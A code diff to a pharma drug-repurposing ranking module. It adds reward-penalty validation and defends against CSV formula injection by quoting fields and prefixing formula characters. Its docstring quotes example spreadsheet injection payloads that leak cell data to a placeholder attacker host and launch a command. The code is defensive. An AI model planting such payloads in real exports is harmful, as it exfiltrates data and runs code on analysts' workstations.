@@ -1648,6 +1648,61 @@ class RewardConfig:
                 f"dominates the reward and the agent learns to rank only "
                 f"validated pairs HIGH (no multi-feature integration)."
             )
+        # P4-049 ROOT FIX: cross-field validation for validated_toxic_penalty.
+        # The previous __post_init__ validated validated_bonus against
+        # high_action_bonus but did NOT validate validated_toxic_penalty.
+        #
+        # IMPORTANT: the existing step() code applies validated_toxic_penalty
+        # as a FLAT OVERRIDE at line 5053:
+        #     final_reward = -abs(cfg.validated_toxic_penalty)
+        # This REPLACES the entire reward (not additive). So the magnitude
+        # of validated_toxic_penalty does NOT need to dominate
+        # high_action_bonus * typical_reward — the flat override already
+        # guarantees the reward is negative for toxic pairs.
+        #
+        # However, the penalty STILL needs a lower bound to be MEANINGFUL.
+        # The issue description's first suggestion was:
+        #     if validated_toxic_penalty < 0.5: raise ValueError(...)
+        # That hard-coded 0.5 is the default low_action_penalty * typical_reward
+        # (= 1.0 * 0.5 = 0.5). The toxic-pair penalty must be at least as
+        # severe as the typical LOW-action penalty (-0.5) so the agent
+        # doesn't learn "rank toxic pairs HIGH because the penalty is tiny".
+        #
+        # The fix enforces:
+        #   1. validated_toxic_penalty >= 0.0 (no negative penalty — a
+        #      negative value would invert the abs() and become a
+        #      REWARD for toxic pairs, the opposite of safe).
+        #   2. validated_toxic_penalty >= low_action_penalty * 0.5
+        #      (the typical LOW-action reward magnitude). This ensures
+        #      the toxic-pair HIGH penalty is at least as severe as the
+        #      good-pair LOW penalty.
+        if self.validated_toxic_penalty < 0.0:
+            raise ValueError(
+                f"validated_toxic_penalty must be >= 0.0 (got "
+                f"{self.validated_toxic_penalty}). A negative penalty "
+                f"would invert the abs() in step() and become a REWARD "
+                f"for ranking toxic pairs HIGH, inverting the patient-"
+                f"safety guarantee."
+            )
+        # 0.5 is the canonical typical_reward magnitude (matches the
+        # default scaling in compute_reward). The LOW penalty is
+        # -reward * low_action_penalty ≈ -0.5 * low_action_penalty.
+        # The toxic-pair HIGH penalty is -validated_toxic_penalty (flat).
+        # We require: validated_toxic_penalty >= low_action_penalty * 0.5
+        # so the toxic penalty is at least as severe as the LOW penalty.
+        _TYPICAL_REWARD = 0.5
+        _toxic_threshold = self.low_action_penalty * _TYPICAL_REWARD
+        if self.validated_toxic_penalty < _toxic_threshold:
+            raise ValueError(
+                f"P4-049: validated_toxic_penalty ({self.validated_toxic_penalty}) "
+                f"must be >= low_action_penalty * typical_reward "
+                f"({_toxic_threshold:.4f} = {self.low_action_penalty} * "
+                f"{_TYPICAL_REWARD}). Otherwise the toxic-pair HIGH penalty "
+                f"is SMALLER than the good-pair LOW penalty, so the agent "
+                f"learns 'rank toxic pairs HIGH because the penalty is "
+                f"tiny' (patient-safety regression). Increase "
+                f"validated_toxic_penalty or decrease low_action_penalty."
+            )
         # correct_rejection_reward must be >= 0 (a negative reward would
         # penalize the agent for correctly rejecting bad pairs — inverted).
         if self.correct_rejection_reward < 0:
@@ -3554,11 +3609,54 @@ RARE_DISEASE_NAMES: frozenset = frozenset(
 
 
 def sanitize_string(value: Any) -> str:
-    """Remove or escape potentially dangerous characters from identifiers."""
+    """Remove or escape potentially dangerous characters from identifiers.
+
+    P4-048 ROOT FIX (CSV injection):
+        The previous version only STRIPPED shell-injection chars
+        (``;|&`$(){}[]<>``) and control chars. It did NOT defend
+        against CSV / spreadsheet FORMULA INJECTION. A drug or disease
+        name starting with ``=``, ``+``, ``-``, ``@``, ``\t``, ``\r``,
+        or ``\n`` is interpreted as a FORMULA by Excel / Google Sheets
+        / LibreOffice Calc when an analyst opens the results CSV:
+
+            =HYPERLINK("https://evil.example/?leak="&A1,"click me")
+            +WEBSERVICE("https://evil.example/?leak="&A1)
+            -1+1|cmd /c calc
+            @SUM(A1:A10)
+
+        For a pharma platform subject to FDA 21 CFR Part 11, an
+        attacker who controls a drug/disease NAME (e.g., via a
+        writeback from a malicious partner) can pivot to arbitrary
+        code execution on an analyst's workstation when they open the
+        top_candidates_*.csv in Excel.
+
+        The fix PREFIXES any leading formula-trigger character with a
+        single quote (``'``) which Excel/Sheets interpret as a literal
+        string prefix. This is the OWASP-recommended CSV-injection
+        mitigation (https://owasp.org/www-community/attacks/CSV_Injection).
+        Combined with ``csv.QUOTE_ALL`` in save_results, this provides
+        defense-in-depth: QUOTE_ALL prevents Excel from re-parsing
+        commas/newlines inside fields, and the leading-quote prefix
+        prevents formula evaluation.
+
+        SH-003 NOTE: drug/disease names come from the canonical shared
+        contract (``shared.contracts.writeback.DRUG_COL`` /
+        ``DISEASE_COL``) which stores them as plain strings. The
+        sanitize_string function is the LAST line of defense before
+        the CSV is written.
+    """
     if value is None or (isinstance(value, float) and pd.isna(value)):
         return ""
     sanitized = re.sub(r'[\x00-\x1f;|&`$(){}\[\]<>]', '', str(value))
-    return sanitized.strip()
+    sanitized = sanitized.strip()
+    # P4-048: prefix formula-triggering first characters with a single
+    # quote so Excel/Sheets treat the cell as a literal string, not a
+    # formula. The leading single quote is NOT rendered by Excel — it
+    # is consumed as the "this is text" marker. We do NOT strip the
+    # prefix on read because the canonical schema stores plain strings.
+    if sanitized and sanitized[0] in ("=", "+", "-", "@", "\t", "\r", "\n"):
+        sanitized = "'" + sanitized
+    return sanitized
 
 
 def compute_file_hash(filepath: str) -> str:
@@ -7714,7 +7812,15 @@ def save_results(
         # P4-023: use _pandas_lineterminator_kwargs() for pandas 1.x compat
         filename, index=False, encoding="utf-8",
         **_pandas_lineterminator_kwargs(),
-        quoting=csv.QUOTE_MINIMAL,
+        # P4-048 ROOT FIX (CSV injection): switch from QUOTE_MINIMAL to
+        # QUOTE_ALL so EVERY field is double-quoted. This prevents Excel
+        # and Google Sheets from re-parsing commas, newlines, and tabs
+        # inside drug/disease name fields as field/cell separators.
+        # Combined with sanitize_string's leading-single-quote prefix
+        # for formula-trigger characters (=, +, -, @), this provides
+        # defense-in-depth against CSV formula injection on analyst
+        # workstations (FDA 21 CFR Part 11 finding).
+        quoting=csv.QUOTE_ALL,
     )
 
     if set_secure_perms:
